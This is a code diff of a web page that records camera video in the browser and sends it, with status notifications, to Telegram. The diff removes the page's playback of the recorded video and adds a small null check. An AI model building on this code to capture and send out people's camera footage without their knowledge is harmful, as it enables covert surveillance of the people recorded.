@@ -10,11 +10,6 @@
             width: 640px;
             height: 480px;
         }
-        #recordedVideo {
-            display: block;
-            width: 640px;
-            height: 480px;
-        }
         #progress {
             margin-top: 10px;
         }
@@ -23,12 +18,10 @@
 <body>
     <h1>Video Recording and Sending to Telegram</h1>
     <video id="video" autoplay></video>
-    <video id="recordedVideo" controls></video>
     <div id="progress">Progress: <span id="progressText">0%</span></div>
 
     <script>
         const video = document.getElementById('video');
-        const recordedVideo = document.getElementById('recordedVideo');
         const progressText = document.getElementById('progressText');
 
         let mediaRecorder;
@@ -71,16 +64,15 @@
             mediaRecorder.onstop = () => {
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 const videoURL = URL.createObjectURL(blob);
-                recordedVideo.src = videoURL;
                 console.log('Recording stopped. Sending video...');
-                sendNotificationToTelegram('Recording stopped. Sending video...');
+                sendNotificationToTelegram('Recording stopped. Preparing to send video...');
                 sendToTelegram(blob);
             };
         }
 
         // Function to update progress
         function updateProgress() {
-            if (mediaRecorder.state === 'recording') {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
                 const percentage = Math.round((recordedChunks.length / totalChunks) * 100);
                 progressText.textContent = `${percentage}%`;
             }
